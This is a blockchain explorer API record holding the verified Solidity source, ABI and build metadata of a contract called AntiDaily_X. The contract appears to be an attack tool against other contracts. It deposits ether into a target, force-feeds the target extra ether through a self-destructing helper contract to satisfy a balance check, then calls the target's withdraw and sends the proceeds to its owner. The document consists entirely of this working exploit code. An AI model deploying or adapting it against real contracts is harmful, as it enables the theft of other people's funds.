{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.5.0;\r\n\r\ncontract Pass {\r\n    constructor(address payable targetAddress) public payable {\r\n        selfdestruct(targetAddress);\r\n    }\r\n}\r\n\r\ninterface TargetInterface {\r\n    function checkBalance() external view returns (uint256);\r\n    function withdraw() external returns (bool);\r\n}\r\n\r\ncontract AntiDaily_X {\r\n    address payable private owner;\r\n    \r\n    modifier onlyOwner {\r\n        require(msg.sender == owner);\r\n        _;\r\n    }\r\n\r\n    constructor() public payable {\r\n        owner = msg.sender;\r\n    }\r\n    \r\n    function investTargetMsgValue(address payable targetAddress) public payable {\r\n        investTargetAmount(targetAddress, msg.value);\r\n    }\r\n\r\n    function investTargetAmount(address payable targetAddress, uint256 amount) public payable onlyOwner {\r\n        (bool success, bytes memory data) = targetAddress.call.value(amount)(\"\");\r\n        require(success);\r\n        data; // make compiler happy\r\n    }\r\n\r\n    function withdrawTarget(address payable targetAddress, bool toOwner) public payable onlyOwner {\r\n        uint256 targetBalanceTotal = targetAddress.balance;\r\n        TargetInterface target = TargetInterface(targetAddress);\r\n        uint256 targetBalanceUser = target.checkBalance();\r\n\r\n        if (targetBalanceUser >= targetBalanceTotal) {\r\n            uint256 needAdd = targetBalanceUser - targetBalanceTotal + 1 wei;\r\n            require(address(this).balance >= needAdd);\r\n            (new Pass).value(needAdd)(targetAddress);\r\n        }\r\n\r\n        target.withdraw();\r\n        \r\n        if (toOwner) {\r\n            owner.transfer(address(this).balance);\r\n        }\r\n    }\r\n    \r\n    function withdraw() public onlyOwner {\r\n        owner.transfer(address(this).balance);\r\n    }\r\n\r\n    function kill() public onlyOwner {\r\n        selfdestruct(owner);\r\n    }\r\n\r\n    function () external payable {\r\n    }\r\n    \r\n}","ABI":"[{\"constant\":false,\"inputs\":[{\"name\":\"targetAddress\",\"type\":\"address\"}],\"name\":\"investTargetMsgValue\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"withdraw\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"kill\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"targetAddress\",\"type\":\"address\"},{\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"investTargetAmount\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"targetAddress\",\"type\":\"address\"},{\"name\":\"toOwner\",\"type\":\"bool\"}],\"name\":\"withdrawTarget\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]","ContractName":"AntiDaily_X","CompilerVersion":"v0.5.1+commit.c8a2cb62","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://5f1527ad04cef3cee608b4fbac199be3b98a169aa4437319e035c22a40aee2a4"}]}